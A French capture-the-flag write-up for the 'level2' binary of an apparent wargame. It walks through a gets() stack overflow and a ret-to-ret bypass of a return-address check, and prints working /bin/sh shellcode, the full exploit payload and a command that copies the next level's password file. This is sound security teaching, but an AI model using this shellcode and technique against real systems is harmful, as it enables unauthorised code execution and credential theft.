
## Level2

L’exécutable `level2` lit sur `stdin` et renvoie ce qu'il a lu sur `stdout`.

On peut voir que le main fait simplement un appel à la fonction `p()` :

```asm
   ; function p() :;
   [...]
   0x080484d7 <+3>:	sub    $0x68,%esp ; un buffer de 0x68
   [...]
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   ;gets() prend en parametre l'adresse du buffer.
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   ; le save de l'EIP est copie dans le buffer
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   ; si l'adresse copiee commence par 0xb[...] , le programme exit. 
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   [...]
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   [...]
 
```

La première idée est de remplir le  buffer avec un shell-code pour réécrire la sauvegarde de EIP avec l'adresse du shell-code. Mais le buffer est en `0xb[...]` et la condition suivante exit le programme dans ce cas.

##### Buffer:

```
0xbffff63c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff64c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff65c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff66c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff67c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff68c:	0x08048500	0x08048550

```
*État du buffer, rempli de "A", sans overflow. En dernière ligne, on voit l'adresse sur laquelle le programme va Jump en fin de fonction.*

On ne peut donc pas directement donner l'adresse du buffer qui contient notre Shell-code.

On va plutôt lui donner l'adresse du retour de `p()` :  `0x0804853e <+106>:	ret `

À la fin de `p` l'instruction `leave` va décaler `ESP` sur `EBP` (`ESP` pointe donc maintenant sur la sauvegarde de l'`EBP`) et pop cette sauvegarde dans `EBP` (dans le but de restaurer la stackframe du main).

L'instruction `ret` va pop dans `EIP` (en l’occurrence la sauvegarde de l'`EIP` qu'on a surchargé avec l'adresse de `ret`), puis va jump à cette adresse (dans notre cas `ret` sera appelé à nouveau). Dans la stackframe de `p` il ne reste plus qu'une adresse qui s'apprête à son tour à être pop et dont on exécutera l'instruction suite au jump à son adresse (sur le dump plus haut, en `0x08048550`).

À la place de cette adresse, on peut donc mettre un adresse de notre choix, en l’occurrence celle d'une variable d'environnement contenant un shell-code : 

 ```
 export SHELL_CODE=$(python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
 ```

On utilise `x/20s *((char **)environ)` dans gdb pour trouver son adresse à laquelle on ajoute la taille de son nom (dans notre cas 10).

```
cat <(python -c 'print("A"* 80 + "\x3e\x85\x04\x08" + "\x98\xfe\xff\xbf")') - | ./level2
$ cat /home/user/level3/.pass > /tmp/pass
```
